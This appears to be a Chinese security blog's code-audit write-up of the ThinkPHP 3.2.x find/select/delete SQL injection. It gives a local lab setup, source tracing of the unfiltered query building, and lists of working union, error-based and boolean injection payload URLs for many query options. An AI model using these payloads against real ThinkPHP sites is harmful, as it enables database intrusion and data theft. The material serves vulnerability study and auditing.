@@ -1,0 +1,637 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23) | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—ThinkPHP3.2.X_find_select_delete注入(2018-08-23)
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2021-12-22 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/I8zfItXpKf/" class="post-tags">
+                            # ThinkPHP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="环境搭建">环境搭建</h1>
+<p><a href="https://www.thinkphp.cn/donate/download/id/610.html">下载：ThinkPHP3.2.3完整版 - ThinkPHP框架</a></p>
+<h2 id="数据库配置">数据库配置</h2>
+<p>创建数据库thinkphp,表为user,含有三个字段id,username,pass</p>
+<p>修改Application\Common\Conf\config.php配置文件，添加数据库配置信息</p>
+<pre><code> &lt;?php
+return array(
+	'DB_TYPE'               =&gt;  'mysql',     // 数据库类型
+    'DB_HOST'               =&gt;  '127.0.0.1', // 服务器地址
+    'DB_NAME'               =&gt;  'thinkphp',          // 数据库名
+    'DB_USER'               =&gt;  'root',      // 用户名
+    'DB_PWD'                =&gt;  'root',          // 密码
+    'DB_PORT'               =&gt;  '3306',        // 端口
+    'DB_PREFIX'             =&gt;  '',    // 数据库表前缀
+    'DB_PARAMS'             =&gt;  array(), // 数据库连接参数
+    'DB_DEBUG'              =&gt;  TRUE, // 数据库调试模式 开启后可以记录SQL日志
+    'DB_FIELDS_CACHE'       =&gt;  true,        // 启用字段缓存
+    'DB_CHARSET'            =&gt;  'utf8',      // 数据库编码默认采用utf8
+    'DB_DEPLOY_TYPE'        =&gt;  0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)
+    'DB_RW_SEPARATE'        =&gt;  false,       // 数据库读写是否分离 主从式有效
+    'DB_MASTER_NUM'         =&gt;  1, // 读写分离后 主服务器数量
+    'DB_SLAVE_NO'           =&gt;  '', // 指定从服务器序号
+);
+</code></pre>
+<h2 id="数据库测试">数据库测试</h2>
+<p>在<strong>thinkphp32\Application\Home\Controller\IndexController.class.php</strong> 创建函数，内容如下：</p>
+<pre><code class="language-php">    public function test(){
+        $data = M('users')-&gt;where('id=1')-&gt;select();
+        var_dump($data);
+    }
+</code></pre>
+<p>浏览器访问测试：</p>
+<p><a href="http://127.0.0.1/index.php/Home/Index/test">http://127.0.0.1/index.php/Home/Index/test</a></p>
+<p><a href="http://127.0.0.1/index.php?m=Home&amp;c=index&amp;a=test">http://127.0.0.1/index.php?m=Home&amp;c=index&amp;a=test</a></p>
+<p><a href="http://127.0.0.1/index.php?s=home/index/test">http://127.0.0.1/index.php?s=/Home/index/test</a></p>
+<h1 id="selectfind">select/find</h1>
+<p>在<strong>thinkphp32\Application\Home\Controller\IndexController.class.php</strong> 创建函数，内容如下：</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8');
+    }
+
+    public function test(){
+        $id = I(id);
+        $data = M('users')-&gt;select($id);
+        var_dump($data);
+    }
+}
+</code></pre>
+<h2 id="payload">payload</h2>
+<p>where</p>
+<pre><code>#第一种payload
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 union select 1,2,user() %23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,user())) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=1=1 %23
+
+#第二种payload
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) union select 1,2,user() %23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=extractvalue(0x7e,concat(0x7e,user()))) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=1=1) %23
+</code></pre>
+<p>field</p>
+<pre><code>#注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹;并且需要知道目标数据库中至少1个数据表
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 from users union select user()%23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=1 , extractvalue(0x7e, concat(0x7e, user())) from users %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[field]=* from users where 1=1 %23　
+</code></pre>
+<p>table</p>
+<pre><code># 注:请保证以,为分割payload,保证分割得到的每一部分均含有至少一个空格(或其他parseKey中匹配的字符),否则该部分会被一对`包裹;
+# 并且需要知道目标数据库中至少1个数据表
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users union select 1,2,user() %23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;?id[table]=users where extractvalue(0x7e, concat(0x7e, user())) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[table]=users where 1=1 %23
+</code></pre>
+<p>join</p>
+<pre><code>#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=union select 1,2 %23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where extractvalue(0x7e,concat(0x7e,user())) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[join][]=where 1=1 %23　
+</code></pre>
+<p>force</p>
+<pre><code>#注:审计环境设置的索引为字段id,使用payload时请修改为对应的索引,在未知索引或不存在索引的情况下无法使用
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) union select 1,2,user() %23
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where extractvalue(0x7e,concat(0x7e,version())) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[force]=id) where 1=1 %23　
+</code></pre>
+<p>group</p>
+<pre><code>#注:需要已知所查数据表中任意一字段名
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[group]=id union select 1,2,user() %23
+</code></pre>
+<p>having</p>
+<pre><code>#注:需要已知所查数据表中任意一字段名
+#联合查询
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=id union select 1,2,user() %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[having]=1=1 %23
+</code></pre>
+<p>order</p>
+<pre><code>#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=extractvalue(0x7e,concat(0x7e,version())) %23
+#逻辑判断
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[order]=1=1 %23
+</code></pre>
+<p>limit</p>
+<pre><code>#限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用
+#报错
+http://127.0.0.1/index.php?s=/Home/index/test&amp;id[page][]=1&amp;id[page][]=1 procedure analyse(extractvalue(0x7e,concat(0x7e, version())),number) %23　
+</code></pre>
+<p>alias</p>
+<pre><code>http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+</code></pre>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>首先用 <code>I</code> 方法获取id的值，跟进<code>I</code>方法，过滤方式 filter 默认为 DEFAULT_FILTER ，对应值为htmlspecialchars。</p>
+<pre><code>$filters    =   isset($filter)?$filter:C('DEFAULT_FILTER');
+</code></pre>
+<p>然后判断传入的参数是不是数组，使用filter对应的方法处理一边，但是因为默认为htmlspecialchars，对其值进行实体编码，所以并没什么影响</p>
+<pre><code>$data   =   is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤
+</code></pre>
+<p>然后在380行进行了强制类型转换,默认为字符型，所以也没影响</p>
+<pre><code class="language-php">        if(!empty($type)){
+        	switch(strtolower($type)){
+        		case 'a':	// 数组
+        			$data 	=	(array)$data;
+        			break;
+        		case 'd':	// 数字
+        			$data 	=	(int)$data;
+        			break;
+        		case 'f':	// 浮点
+        			$data 	=	(float)$data;
+        			break;
+        		case 'b':	// 布尔
+        			$data 	=	(boolean)$data;
+        			break;
+                case 's':   // 字符串
+                default:
+                    $data   =   (string)$data;
+        	}
+        }
+</code></pre>
+<p>最后在402行,如果传值为数组时，会进行正则过滤</p>
+<pre><code class="language-php">    is_array($data) &amp;&amp; array_walk_recursive($data,'think_filter');
+</code></pre>
+<p>但是这里的过滤关键字并不针对SQL注入漏洞，可以轻易饶过</p>
+<pre><code class="language-php">    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){
+        $value .= ' ';
+    }
+</code></pre>
+<p>然后再看select函数的内部实现</p>
+<p>当<code>$options</code>为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段</p>
+<pre><code class="language-php">        if(is_string($options) || is_numeric($options)) {
+            // 根据主键查询
+            if(strpos($options,',')) {
+                $where[$pk]     =  array('IN',$options);
+            }else{
+                $where[$pk]     =  $options;
+            }
+            $options            =  array();
+            $options['where']   =  $where;
+        }
+</code></pre>
+<p>满足<code>$options</code> 和 <code>$pk</code>主键同时为数组时，进入根据复合主键查询，但这个对于表只设置一个主键的时候不成立。</p>
+<pre><code class="language-php">elseif (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) 
+</code></pre>
+<p>如果 <code>$options</code>  为 false , 用于子查询 不查询只返回SQL</p>
+<pre><code class="language-php">elseif(false === $options){ // 用于子查询 不查询只返回SQL
+        	$options['fetch_sql'] = true;
+        }
+</code></pre>
+<p>那么就可以使<code>$options</code>为数组，同时找到一个表只有一个主键，就可以绕过三次判断，直接进入<code>_parseOptions</code>进行解析。</p>
+<p>然后看表达式分析  <code>_parseOptions</code> 方法</p>
+<p><code>$options</code>我们可控，那么就可以控制为数组类型，传入<code>$options['table']</code>或<code>$options['alias']</code>等等，都没有进行过滤</p>
+<p>传入<code>$options['where']</code> 时，设置<code>$options['where']</code>的值为字符串，即可绕过字段类型的验证。</p>
+<pre><code class="language-php">    protected function _parseOptions($options=array()) {
+        if(is_array($options))
+            ////当$options为数组的时候 直接与 $this-&gt;options 数组进行 合并
+            $options =  array_merge($this-&gt;options,$options);
+
+        if(!isset($options['table'])){
+            // 自动获取表名
+            $options['table']   =   $this-&gt;getTableName();
+            $fields             =   $this-&gt;fields;
+        }else{
+            // 指定数据表 则重新获取字段列表 但不支持类型检测
+            $fields             =   $this-&gt;getDbFields();
+        }
+
+        // 数据表别名
+        if(!empty($options['alias'])) {
+            $options['table']  .=   ' '.$options['alias'];  //直接进行了拼接
+        }
+        // 记录操作的模型名称
+        $options['model']       =   $this-&gt;name;
+
+        // 字段类型验证， 如果不设置where，或者设置为字符串，这里即可绕过
+        if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) {
+            // 对数组查询条件进行字段类型检查
+            foreach ($options['where'] as $key=&gt;$val){
+                $key            =   trim($key);
+                if(in_array($key,$fields,true)){
+                    if(is_scalar($val)) {
+                        $this-&gt;_parseType($options['where'],$key);
+                    }
+                }elseif(!is_numeric($key) &amp;&amp; '_' != substr($key,0,1) &amp;&amp; false === strpos($key,'.') &amp;&amp; false === strpos($key,'(') &amp;&amp; false === strpos($key,'|') &amp;&amp; false === strpos($key,'&amp;')){
+                    if(!empty($this-&gt;options['strict'])){
+                        E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
+                    } 
+                    unset($options['where'][$key]);
+                }
+            }
+        }
+        // 查询过后清空sql表达式组装 避免影响下次查询
+        $this-&gt;options  =   array();
+        // 表达式过滤
+        $this-&gt;_options_filter($options);
+        return $options;
+    }
+</code></pre>
+<p>然后返回，ThinkPHP\Library\Think\Model.class.php</p>
+<pre><code>$options    =  $this-&gt;_parseOptions($options);
+....
+// 重点关注
+$resultSet  = $this-&gt;db-&gt;select($options);
+</code></pre>
+<p>跟进 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>d</mi><mi>b</mi><mo>−</mo><mo>&gt;</mo><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">this-&gt;db-&gt;select(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>options)</p>
+<pre><code class="language-php">    public function select($options=array()) {
+        $this-&gt;model  =   $options['model'];
+        $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
+        $sql    = $this-&gt;buildSelectSql($options);// 生成执行sql语句
+        $result   = $this-&gt;query($sql,!empty($options['fetch_sql']) ? true : false);// 执行sql语句
+        return $result;
+    }
+</code></pre>
+<p>跟进sql语句构建函数  <code>buildSelectSql</code></p>
+<pre><code class="language-php">    public function buildSelectSql($options=array()) {
+        if(isset($options['page'])) {
+            // 根据页数计算limit,分页控制，这里强制转换成整数了，无法利用
+            list($page,$listRows)   =   $options['page'];
+            $page    =  $page&gt;0 ? $page : 1;
+            $listRows=  $listRows&gt;0 ? $listRows : (is_numeric($options['limit'])?$options['limit']:20);
+            $offset  =  $listRows*($page-1);
+            $options['limit'] =  $offset.','.$listRows;
+        }
+        $sql  =   $this-&gt;parseSql($this-&gt;selectSql,$options);
+        return $sql;
+    }
+</code></pre>
+<p>继续跟进 <code>parseSql</code> 方法</p>
+<pre><code class="language-php">    public function parseSql($sql,$options=array()){
+        $sql   = str_replace(
+            array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
+            array(
+                $this-&gt;parseTable($options['table']),
+                $this-&gt;parseDistinct(isset($options['distinct'])?$options['distinct']:false),
+                $this-&gt;parseField(!empty($options['field'])?$options['field']:'*'),
+                $this-&gt;parseJoin(!empty($options['join'])?$options['join']:''),
+                $this-&gt;parseWhere(!empty($options['where'])?$options['where']:''),
+                $this-&gt;parseGroup(!empty($options['group'])?$options['group']:''),
+                $this-&gt;parseHaving(!empty($options['having'])?$options['having']:''),
+                $this-&gt;parseOrder(!empty($options['order'])?$options['order']:''),
+                $this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:''),
+                $this-&gt;parseUnion(!empty($options['union'])?$options['union']:''),
+                $this-&gt;parseLock(isset($options['lock'])?$options['lock']:false),
+                $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:''),
+                $this-&gt;parseForce(!empty($options['force'])?$options['force']:'')
+            ),$sql);
+        return $sql;
+    }
+</code></pre>
+<p>这里对SQL模板语句进行替换, 皆未进行替换。</p>
+<p>以where部分为例,<code>parseWhere</code> 方法</p>
+<pre><code class="language-php">if(is_string($where)) {
+            // 直接使用字符串条件
+            $whereStr = $where;
+        }else{ // 使用数组表达式
+			......
+             foreach ($where as $key=&gt;$val){
+                if(is_numeric($key)){
+                   $key  = '_complex';
+                }
+                if(0===strpos($key,'_')) {
+                   // 解析特殊条件表达式
+                   $whereStr   .= $this-&gt;parseThinkWhere($key,$val);
+                }else{
+                   ......
+                }
+             }
+		}
+               
+</code></pre>
+<p>当where部分为字符串时，直接进行了拼接，所以最简单粗暴的就直接构造</p>
+<pre><code class="language-php">http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where]=0 union select 1,2,user() %23
+</code></pre>
+<p>当where部分为 数组表达式时，遍历数组key、value值，当key以_开头时进入特殊表达式解析函数<code>parseThinkWhere</code></p>
+<pre><code class="language-php">    protected function parseThinkWhere($key,$val) {
+        $whereStr   = '';
+        switch($key) {
+            case '_string':
+                // 字符串模式查询条件
+                $whereStr = $val;
+                break;
+            case '_complex':
+                // 复合查询条件
+                $whereStr = substr($this-&gt;parseWhere($val),6);
+                break;
+            case '_query':
+                // 字符串模式查询条件
+                parse_str($val,$where);
+                if(isset($where['_logic'])) {
+                    $op   =  ' '.strtoupper($where['_logic']).' ';
+                    unset($where['_logic']);
+                }else{
+                    $op   =  ' AND ';
+                }
+                $array   =  array();
+                foreach ($where as $field=&gt;$data)
+                    $array[] = $this-&gt;parseKey($field).' = '.$this-&gt;parseValue($data);
+                $whereStr   = implode($op,$array);
+                break;
+        }
+        return '( '.$whereStr.' )';
+    }
+</code></pre>
+<p>可以看到，当<code>$key</code>  为 <code>_string</code>时，直接将 <code>$val</code> 复制给 <code>$whereStr</code></p>
+<p>最后 拼接在了一对 括号 里面返回，所以这里又有了另外一种payload</p>
+<pre><code class="language-php">http://127.0.0.1/index.php?s=/Home/index/test&amp;id[where][_string]=0) union select 1,2,user() %23
+</code></pre>
+<h1 id="delete">delete</h1>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8');
+    }
+
+    public function test(){
+        $id = I(id);
+        $data = M('users')-&gt;delete($id);
+        var_dump($data);
+    }
+}
+</code></pre>
+<h2 id="payload-2">payload</h2>
+<p>table部分</p>
+<pre><code>#报错
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23
+#逻辑判断
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[table]=users where 1=1 %23
+</code></pre>
+<p>where部分</p>
+<pre><code>#报错
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version()))
+#逻辑判断
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1=1
+</code></pre>
+<p>order部分</p>
+<pre><code>#报错
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23
+#逻辑判断
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=1=1 %23
+</code></pre>
+<p>limit部分</p>
+<pre><code>#限于5.0.0&lt; MySQL &lt;5.6.6版本才能使用
+#报错
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=1!=1&amp;id[order]=extractvalue(0x7e, concat(0x7e, version())) %23
+</code></pre>
+<p>comment部分</p>
+<pre><code>#报错
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/extractvalue(0x7e,concat(0x7e, version())) %23
+#逻辑判断
+http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]= &amp;id[comment]=*/1=1 %23
+</code></pre>
+<h2 id="漏洞分析-2">漏洞分析</h2>
+<p><code>delete</code>函数和<code>select/find</code>函数类似，直接进入 <code>delete</code> 函数</p>
+<p>在解析完<code>$options</code>之后，还对<code>$options['where']</code>判断了一下是否为空，</p>
+<p>所以<code>where</code>需要我们传一下值</p>
+<pre><code class="language-php">        $options =  $this-&gt;_parseOptions($options);
+        if(empty($options['where'])){
+            // 如果条件为空 不进行删除操作 除非设置 1=1
+            return false;
+        }    
+		......
+        $result  =    $this-&gt;db-&gt;delete($options);
+		......
+</code></pre>
+<p>然后跟进 <code>$this-&gt;db-&gt;delete($options)</code></p>
+<pre><code class="language-php">    public function delete($options=array()) {
+        $this-&gt;model  =   $options['model'];
+        $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
+        $table  =   $this-&gt;parseTable($options['table']);
+        $sql    =   'DELETE FROM '.$table;
+        if(strpos($table,',')){// 多表删除支持USING和JOIN操作
+            if(!empty($options['using'])){
+                $sql .= ' USING '.$this-&gt;parseTable($options['using']).' ';
+            }
+            $sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:'');
+        }
+        $sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:'');
+        if(!strpos($table,',')){
+            // 单表删除支持order和limit
+            $sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'')
+            .$this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:'');
+        }
+        $sql .=   $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:'');
+        return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false);
+    }
+</code></pre>
+<p>在跟进到 <code>parseWhere</code></p>
+<pre><code class="language-php">    protected function parseWhere($where) {
+        $whereStr = '';
+        if(is_string($where)) {
+            // 直接使用字符串条件
+            $whereStr = $where;
+        }else{ // 使用数组表达式
+        	.....
+        }
+        return empty($whereStr)?'':' WHERE '.$whereStr;
+    }
+</code></pre>
+<p>最终在前面拼接了 <code>WHERE</code> 直接返回，无任何过滤</p>
+<pre><code class="language-php">http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=extractvalue(0x7e,concat(0x7e,version()))
+</code></pre>
+<p>如何在table部分注入,需要吧<code>parseWhere</code> 方法里面最后拼接的 <code>WHERE</code> 给注释掉，否早语法报错</p>
+<pre><code class="language-php">http://192.168.1.8/index.php?s=/Home/index/test&amp;id[where]=123&amp;id[table]=users where extractvalue(0x7e, concat(0x7e, version())) %23
+
+// 最终拼接的语句
+DELETE FROM users where extractvalue(0x7e,concat(0x7e,version())) # WHERE 123
+</code></pre>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.cnblogs.com/Article-kelp/p/15417199.html">ThinkPHP3.2.3代码审计 - Article_kelp - 博客园</a></p>
+<p><a href="https://xz.aliyun.com/t/2631">thinkphp3.2_find_select_delete注入 - 先知社区</a></p>
+<p><a href="https://xz.aliyun.com/t/2629">ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23) - 先知社区</a></p>
+<p><a href="https://www.t00ls.com/articles-51907.html">Thinkphp3.x/5.x系列漏洞总结学习 - T00ls.Com</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://bewhale.github.io/post/PHP代码审计—环境搭建/" class="post-title gt-a-link">
+                    PHP代码审计—环境搭建
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
